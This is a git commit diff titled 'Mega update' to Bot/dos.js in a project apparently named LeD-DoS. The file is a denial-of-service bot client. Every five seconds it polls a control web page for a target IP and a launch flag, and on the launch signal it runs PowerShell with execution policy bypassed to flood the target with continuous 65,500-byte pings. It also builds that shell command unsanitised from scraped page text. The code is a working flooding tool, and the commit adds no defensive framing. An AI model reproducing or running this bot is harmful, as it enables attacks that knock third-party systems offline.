54cb61fa422ad10013ef656b800e25f642290980
NukeZ <brycelogue@gmail.com>
2019-07-14 15:39:36 -0400

    Mega update

--- Bot/dos.js
+++ Bot/dos.js
@@ -1,3 +1,5 @@
+/*jshint esversion: 6 */
+
 const request = require('request');
 const cheerio = require('cheerio');
 var ping = require('ping');
@@ -6,43 +8,43 @@ const Shell = require('node-powershell');
 
 setInterval(function () {
 
-    request('http://localhost/LeD-DoS/Web/dos.php', (error, response, html) => {
-        if (!error && response.statusCode == 200) {
-            const $ = cheerio.load(html);
+  request('http://localhost/LeD-DoS/Web/dos.php', (error, response, html) => {
+    if (!error && response.statusCode == 200) {
+      const $ = cheerio.load(html);
 
-            const ip = $('.ip');
-            const output = ip.find('p').text();
+      const $ip = $('.ip');
+      const output = $ip.find('p').text();
 
-            const check = $('.check');
-            const gotime = check.find('p').text();
+      const $check = $('.check');
+      const gotime = $check.find('p').text();
 
-            var current = fs.readFile("ip.txt", function(err, current){
-                // console.log("IP: " + output + ", Active: " + gotime + ", Current IP: " + current.toString());
-            });
+      // var current = fs.readFile('ip.txt', function(err, current) {
+      //    console.log('IP: ' + output + ', Active: ' + gotime + ', Current IP: ' + current.toString());
+      // });
 
-            if (gotime == 1) {
+      if (gotime == 1) {
 
-                console.log("Ping in progress!");
+        console.log('Ping in progress!');
 
-                const ps = new Shell({
-                    executionPolicy: 'Bypass',
-                    noProfile: true
-                  });
-                   
-                  ps.addCommand('ping ' + output + ' -l 65500 -w 1 -t');
-                  ps.invoke()
-                  .then(com => {
-                    console.log(com);
-                  })
-                  .catch(err => {
-                    console.log(err);
-                  });
+        const ps = new Shell({
+          executionPolicy: 'Bypass',
+          noProfile: true,
+        });
 
-            }
-            
-            if (gotime != '1') {
-                console.log("Awaitng Launch Order!")
-            }
-        }
-    });
+        ps.addCommand('ping ' + output + ' -l 65500 -w 1 -t');
+        ps.invoke()
+          .then(com => {
+            console.log(com);
+          })
+          .catch(err => {
+            console.log(err);
+          });
+
+      }
+
+      if (gotime != '1') {
+        console.log('Awaitng Launch Order!');
+      }
+    }
+  });
 }, 5000);
